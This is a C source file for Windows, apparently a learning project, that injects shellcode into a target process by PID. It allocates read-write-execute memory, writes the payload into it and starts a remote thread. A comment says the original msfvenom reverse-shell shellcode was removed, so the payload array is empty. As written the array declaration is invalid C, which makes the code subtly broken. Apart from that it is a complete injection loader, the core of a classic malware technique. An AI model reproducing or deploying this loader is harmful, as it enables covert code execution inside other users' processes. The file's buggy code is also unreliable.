//INCLUDE HERE
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define k "<+>"
#define ns "<----->"

//ERROR CHECKING FUNCTION prints last error and exits.
static void errFunc(char* prompt) {
	printf("[!!] Failed to %s with error code %ld", prompt, GetLastError());
	exit(1);
}

//Shellcode to be injected into PID specified in Main
char payload[] = NULL; // Originally this was msfvenom shellcode to get a reverse shell, removed for Github.


//MAIN FUNCTION takes PID as argument
int main(int argc, char* argv[]) {


	//DEFINE VARIABLES AND NULLIFY/INITIALIZE
	HANDLE hProcess, hThread = NULL;
	DWORD enterPID, outTID = 0;

	if (argc < 2) {
		printf("%s usage : ./program.exe <pid>\n", k);
		return EXIT_FAILURE;
	}
	enterPID = atoi(argv[1]);

	//OPEN PROCESS
	printf("%s\n%s trying to open a handle to process %ld\n", ns, k, enterPID);

	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, enterPID); //Retrieve handle to PID with Write permissions
	WaitForSingleObject(hProcess, 10000); // Wait for handle

	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE || hProcess == 0) { //Check to see if handle is valid
		errFunc("open process handle");
	}
	printf("%s successful handle for %ld at\n---0x%p\n%s\n", k, enterPID, hProcess, ns);
	
	//ALLOCATE VIRTUAL MEMORY
	printf("%s allocating memory...\n", k);
	LPVOID rBuffer = NULL;
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
	//PAGE_EXECUTE_READWRITE is extremely noisy, but for the sake of progressive learning stealth is not a concern right now
	
	if (rBuffer == NULL || rBuffer == 0) { //Check to see if allocation invalid
		CloseHandle(hProcess); //Gracefully return memory
		errFunc("allocate memory to process");
	}
	printf("%s successfully allocated %zu-bytes to process %ld with rwx permissions\n%s\n", k, sizeof(payload), enterPID, ns);

	//Write process memory using hProcess handle, rBuffer memory alloc
	WriteProcessMemory(hProcess, rBuffer, payload, sizeof(payload), NULL);
	printf("%s wrote %zu-bytes to process memory.\n%s\n", k, sizeof(payload), ns);

	//CREATE REMOTE THREAD TO START PAYLOAD, this would show as EventCode:7 within Sysinternals Sysmon
	printf("%s attempting to create thread to run payload...", k);
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer, //Went through a rabbit hole to figure out exactly what this was doing, figured out that LPTHREAD_START_ROUTINE is essentially neccesary for Windows 64 bit systems to be backwards compatible with 32 bit systems within Windows API. 
		//As an aspiring infosec professional shortening any given memory address from 64bits to 32bits seems like a bad idea?
		NULL,
		0,
		0,
		&outTID);

	printf("%s waiting on thread...\n", k);
	WaitForSingleObject(hThread, INFINITE); //Wait on the thread

	if (hThread == NULL || hThread == 0) { //Check to see if thread creation invalid
		CloseHandle(hProcess); //Gracefully return memory
		errFunc("create thread to run payload\n");
	}

	printf("%s thread spawned!\n", k);

	printf("%s\n%s payload finished!", ns, k);

	CloseHandle(hThread); //Gracefully return memory
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}